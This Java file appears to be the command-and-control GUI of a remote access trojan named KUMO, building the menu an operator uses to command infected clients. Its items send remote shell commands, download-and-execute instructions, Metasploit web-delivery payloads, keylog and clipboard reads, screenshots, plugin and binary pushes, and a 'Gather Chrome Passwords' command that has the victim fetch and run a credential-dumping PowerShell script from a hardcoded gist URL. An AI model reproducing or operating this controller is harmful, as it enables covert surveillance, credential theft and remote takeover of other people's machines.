package GUI.Components;

import GUI.Controller;
import GUI.Views.*;
import KUMO.Kumo;
import Logger.Level;
import Logger.Logger;
import Server.ClientObject;
import Server.Data.PseudoBase;
import Server.Data.Repository;
import javafx.scene.Scene;
import javafx.scene.control.ContextMenu;
import javafx.scene.control.Menu;
import javafx.scene.control.MenuItem;
import javafx.scene.control.TableCell;
import javafx.scene.input.Clipboard;
import javafx.scene.input.ClipboardContent;
import javafx.scene.input.MouseEvent;
import javafx.stage.DirectoryChooser;
import javafx.stage.FileChooser;
import javafx.stage.Stage;
import javafx.stage.StageStyle;

import java.io.*;

class IPContextMenu implements Repository {
    static void getIPContextMenu(TableCell n, MouseEvent e) {
        ClientObject clientObject = ((ClientObject) n.getTableView().getSelectionModel().getSelectedItem());
        ContextMenu cm = new ContextMenu();
        Menu mi1 = new Menu("Actions\t\t\u25B6");
        MenuItem sb1 = new MenuItem("File Explorer");
        sb1.setOnAction(event -> {
            if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                try {
                    clientObject.clientCommunicate("FILELIST");
                } catch (IOException e1) {
                    e1.printStackTrace();
                }
            }
        });
        MenuItem sb2 = new MenuItem("Send Command");
        sb2.setOnAction(event -> {
            Stage stage = new Stage();
            stage.initStyle(StageStyle.UNDECORATED);
            stage.setMinWidth(300);
            stage.setMinWidth(300);
            stage.setScene(new Scene(new SendCommandView().getSendCommandView(stage), 800, 800));
            stage.show();
            SendCommandView.getsendCommandButton().setOnAction(a -> {
                if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                    try {
                        clientObject.clientCommunicate("CMD " + SendCommandView.getTextField().getText());
                    } catch (IOException e1) {
                        e1.printStackTrace();
                    }
                }
            });
        });
        MenuItem sb3 = new MenuItem("Remote Desktop");
        sb3.setOnAction(event -> {
            Stage stage = new Stage();
            stage.initStyle(StageStyle.UNDECORATED);
            stage.setMinWidth(300);
            stage.setMinWidth(300);
            stage.setScene(new Scene(new RemoteDesktopView().getRemoteDesktopView(clientObject, stage), 400, 400));
            stage.show();
        });

        MenuItem si4 = new MenuItem("Take Screenshot");
        si4.setOnAction(event -> {
            if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {

                DirectoryChooser directoryChooser = new DirectoryChooser();
                directoryChooser.setTitle("Select download location");
                File selectedDirectory =
                        directoryChooser.showDialog(Kumo.getPrimaryStage());
                FileContextMenu.selectedDirectory = selectedDirectory.getAbsolutePath();
                try {
                    clientObject.clientCommunicate("SCREENSHOT");
                } catch (IOException e1) {
                    Logger.log(Level.ERROR, e1.toString(), e1);
                }
            }
        });

        MenuItem si5 = new MenuItem("Download & Execute");
        si5.setOnAction(event -> {

            Stage stage = new Stage();
            stage.initStyle(StageStyle.UNDECORATED);
            stage.setMinWidth(300);
            stage.setMinWidth(300);
            stage.setScene(new Scene(new DownloadAndExecuteView().getDownloadAndExecuteView(stage), 400, 250));
            stage.show();
            DownloadAndExecuteView.getDownloadButton().setOnAction(a -> {
                if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                    try {
                        // TODO put in url regex check
                        String url = DownloadAndExecuteView.getUrlFieldValue();
                        Logger.log(Level.INFO, "Sending DaE for: " + url);
                        clientObject.clientCommunicate("DAE " + url);
                        //clientObject.clientCommunicate("CMD " + SendCommandView.getTextField().getText());
                    } catch (IOException e1) {
                        e1.printStackTrace();
                    }
                }
            });
        });

        MenuItem si6 = new MenuItem("System Info");
        si6.setOnAction(event -> {
            Stage stage = new Stage();
            stage.initStyle(StageStyle.UNDECORATED);
            stage.setMinWidth(300);
            stage.setMinHeight(300);
            stage.setScene(new Scene(new SysInfoView().getSysInfoView(stage), 400, 500));
            stage.show();
            if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                try {
                    clientObject.clientCommunicate("SYINFO");
                } catch (IOException e1) {
                    e1.printStackTrace();
                }
            }
        });

        MenuItem si7 = new MenuItem("MSF Web Delivery");
        si7.setOnAction(event -> {
            Stage stage = new Stage();
            stage.initStyle(StageStyle.UNDECORATED);
            stage.setMinWidth(300);
            stage.setMinHeight(300);
            stage.setScene(new Scene(new WebDeliveryView().getWebDeliveryView(stage), 400, 300));
            stage.show();
            WebDeliveryView.getTargetsComboBox().getSelectionModel().selectFirst();
            WebDeliveryView.getExecuteButton().setOnAction(a -> {
                if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                    try {
                        String target = WebDeliveryView.getTargetsComboBox().getSelectionModel().getSelectedItem().toString().toLowerCase();
                        clientObject.clientCommunicate("MSFWD " + target + " " + WebDeliveryView.getUrl().getText());
                        stage.close();
                    } catch (IOException e1) {
                        e1.printStackTrace();
                    }
                }
            });
        });

        MenuItem si8 = new MenuItem("Run plug-in");
        si8.setOnAction(event -> {
            // Get the jar the user wants to run
            FileChooser fileChooser = new FileChooser();
            fileChooser.getExtensionFilters().add(new FileChooser.ExtensionFilter("Runnable JAR file", "*.jar"));
            fileChooser.setTitle("Select plug-in");
            File selectedDirectory = fileChooser.showOpenDialog(Kumo.getPrimaryStage());
            String fileLocation = selectedDirectory.getAbsolutePath();

            File pluginFile = new File(fileLocation);

            // Send the file to client
            /*
            Proto:
            SERVER: PLUGIN
            SERVER: fbytes[n..-1] -> client
            CLIENT: PLUGOUT
            CLIENT: stdout from running plugin
             */
            if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                try {
                    clientObject.clientCommunicate("PLUGIN");
                    Long length = pluginFile.length();
                    DataOutputStream dos = new DataOutputStream(clientObject.getClient().getOutputStream());
                    dos.writeLong(length);
                    FileInputStream fis = new FileInputStream(pluginFile);
                    BufferedInputStream bs = new BufferedInputStream(fis);

                    int fbyte;
                    while ((fbyte = bs.read()) != -1) dos.writeInt(fbyte);
                    bs.close();
                    fis.close();
                    Logger.log(Level.INFO, "New client binary send to " + clientObject.getIP());
                } catch (IOException e1) {
                    new AlertView().showErrorAlert("Unable to communicate with client.");
                }
            }

            // GUI initialization
            Stage stage = new Stage();
            stage.initStyle(StageStyle.UNDECORATED);
            stage.setMinHeight(300);
            stage.setMinWidth(300);
            stage.setScene(new Scene(new PluginView().getPluginViewView(stage), 400, 400));
            stage.show();
        });

        MenuItem si9 = new MenuItem("View keylog file");
        si9.setOnAction(event -> {
            if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                try {
                    clientObject.clientCommunicate("READKEYLOG");
                    Stage stage = new Stage();
                    stage.initStyle(StageStyle.UNDECORATED);
                    stage.setMinWidth(300);
                    stage.setMinHeight(300);
                    stage.setScene(new Scene(new KeyloggerView().getKeyloggerView(stage), 400, 400));
                    stage.show();
                } catch (IOException ioe){
                    new AlertView().showErrorAlert("Unable to communicate with client.");
                    ioe.printStackTrace();
                }
            }
        });

        // Clipboard junk
        Menu clip = new Menu("Clipboard Functions \u25B6");
        MenuItem setClipboard = new MenuItem("Set Clipboard");
        setClipboard.setOnAction(event -> {
            Stage stage = new Stage();
            stage.initStyle(StageStyle.UNDECORATED);
            stage.setMinHeight(150);
            stage.setMinWidth(300);
            stage.setScene(new Scene(new SetClipboardView().getSetClipboardView(stage), 300, 225));
            stage.show();
            SetClipboardView.getSetClipboardButton().setOnAction(a -> {
                if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                    try {
                        clientObject.clientCommunicate("CLIPSET " + SetClipboardView.getTextField().getText().trim());
                        stage.close();
                    } catch (IOException e1) {

                    }
                }
            });
        });

        MenuItem getClipboard = new MenuItem("Get Clipboard Data");
        getClipboard.setOnAction(event -> {
            Stage stage = new Stage();
            stage.initStyle(StageStyle.UNDECORATED);
            stage.setMinHeight(300);
            stage.setMinWidth(300);
            stage.setScene(new Scene(new GetClipboardView().getGetClipboardView(stage), 400, 400));
            stage.show();
            if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                try {
                    clientObject.clientCommunicate("CLIPGET");
                } catch (IOException e1) {

                }
            }
        });
        clip.getItems().addAll(setClipboard, getClipboard);

        //////// PWD recovery \\\\\\\\
        Menu pwdRecovery = new Menu("Password recovery \u25B6");
        MenuItem gatherChrome = new MenuItem("Gather Chrome Passwords (win only)");
        gatherChrome.setOnAction(event -> {
            if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")){
                if (!clientObject.getSYSTEM_OS().toLowerCase().contains("wind")){
                    new AlertView().showErrorAlert("This module is for windows clients only.");
                    return;
                }
                try {

                    clientObject.clientCommunicate("PSHURL https://gist.github.com/cbrnrd/d7e9870549116ba2ccf1dab96c0b91d0/raw/d33c55e3c20c4505fa1666c9f64d581ee700fa29/Get-ChromeDump-CSV.ps1" );

                    Stage stage = new Stage();
                    stage.initStyle(StageStyle.UNDECORATED);
                    stage.setMinHeight(300);
                    stage.setMinWidth(300);
                    stage.setScene(new Scene(new ChromePassView().getChromePassView(stage), 800, 900));
                    stage.show();
                } catch (IOException ioe){
                    ioe.printStackTrace();
                }
            } else {
                new AlertView().showErrorAlert("Client is offline");
            }

        });
        pwdRecovery.getItems().addAll(gatherChrome);

        //////// MISC \\\\\\\\
        Menu misc = new Menu("Misc      \u25B6");
        MenuItem visit = new MenuItem("Visit Website");
        visit.setOnAction(event -> {
            Stage stage = new Stage();
            stage.initStyle(StageStyle.UNDECORATED);
            stage.setMinHeight(100);
            stage.setMinWidth(300);
            stage.setScene(new Scene(new VisitWebsiteView().getVisitWebsiteView(stage), 400, 200));
            stage.show();
            VisitWebsiteView.getGoButton().setOnAction(a -> {
                if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                    try {
                        clientObject.clientCommunicate("VISIT " + VisitWebsiteView.getUrl().getText().trim());
                        stage.close();
                    } catch (IOException e1) {

                    }
                }
            });
        });
        MenuItem showMsgbox = new MenuItem("Show Messagebox");
        showMsgbox.setOnAction(event -> {
            Stage stage = new Stage();
            stage.initStyle(StageStyle.UNDECORATED);
            stage.setMinHeight(100);
            stage.setMinWidth(300);
            stage.setScene(new Scene(new ShowMessageboxView().getShowMessageboxView(stage), 400, 200));
            stage.show();
            ShowMessageboxView.getGoButton().setOnAction(a -> {
                if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                    try {
                        clientObject.clientCommunicate("MSGBOX " + ShowMessageboxView.getMsg().getText().trim());
                        stage.close();
                    } catch (IOException e1) {

                    }
                }
            });
        });

        MenuItem sleep = new MenuItem("Sleep");
        sleep.setOnAction(event -> {
            Stage stage = new Stage();
            stage.initStyle(StageStyle.UNDECORATED);
            stage.setMinHeight(100);
            stage.setMinWidth(300);
            stage.setScene(new Scene(new SleepView().getSleepView(stage), 400, 230));
            stage.show();
            SleepView.getSleepButton().setOnAction(a -> {
                if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                    try {
                        clientObject.clientCommunicate("SLEEP " + Integer.parseInt(SleepView.getTextField().getText().trim()));
                        clientObject.setOnlineStatus("Sleeping");
                        Controller.updateTable();
                        stage.close();
                    } catch (IOException e1) {
                        new AlertView().showErrorAlert("Unable to communicate with client.");
                    }
                }
            });
        });

        MenuItem shutdown = new MenuItem("Shutdown Machine");
        shutdown.setOnAction(event -> {
            if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                try {
                    clientObject.clientCommunicate("SHUTDOWN");
                } catch (IOException e1) {
                    new AlertView().showErrorAlert("Unable to communicate with client.");
                }
            }
        });
        misc.getItems().addAll(visit, showMsgbox, sleep, shutdown);

        MenuItem update = new MenuItem("Update Client");
        update.setOnAction(event -> {
            // Get the file the user wants to send
            FileChooser fileChooser = new FileChooser();
            fileChooser.setTitle("Select new client");
            File selectedDirectory = fileChooser.showOpenDialog(Kumo.getPrimaryStage());
            String fileLocation = selectedDirectory.getAbsolutePath();

            File newClientFile = new File(fileLocation);
            /*
            See Client.java#493
            Protocol:
                SERVER: UPDATE
                SERVER: len(fbytes).to_long
                SERVER: int[n]
             */
            if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                try {
                    clientObject.clientCommunicate("UPDATE");
                    Long length = newClientFile.length();
                    DataOutputStream dos = new DataOutputStream(clientObject.getClient().getOutputStream());
                    dos.writeLong(length);
                    FileInputStream fis = new FileInputStream(newClientFile);
                    BufferedInputStream bs = new BufferedInputStream(fis);

                    int fbyte;
                    while ((fbyte = bs.read()) != -1) dos.writeInt(fbyte);
                    bs.close();
                    fis.close();
                    Logger.log(Level.INFO, "New client binary send to " + clientObject.getIP());
                } catch (IOException e1) {
                    new AlertView().showErrorAlert("Unable to communicate with client.");
                }
            }
        });

        mi1.getItems().addAll(sb1, sb2, si4, si5, si6, si7, si8, si9, clip, pwdRecovery, misc, update);
        MenuItem mi2 = new MenuItem("Copy IP");
        mi2.setOnAction(event -> {
            final Clipboard clipboard = Clipboard.getSystemClipboard();
            final ClipboardContent content = new ClipboardContent();
            content.putString(n.getText());
            clipboard.setContent(content);
        });
        MenuItem mi3 = new MenuItem("Uninstall Server");
        mi3.setOnAction(event -> {
            if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                try {
                    clientObject.clientCommunicate("EXIT");
                } catch (IOException e1) {
                    e1.printStackTrace();
                }
            }
            assert clientObject != null;
            PseudoBase.getKumoData().remove(clientObject.getIP());
            CONNECTIONS.remove(clientObject.getIP());
            Controller.updateStats();
            Controller.updateTable();
        });



        cm.getItems().addAll(mi1, mi2, mi3);
        cm.show(n, e.getScreenX(), e.getScreenY());
    }
}
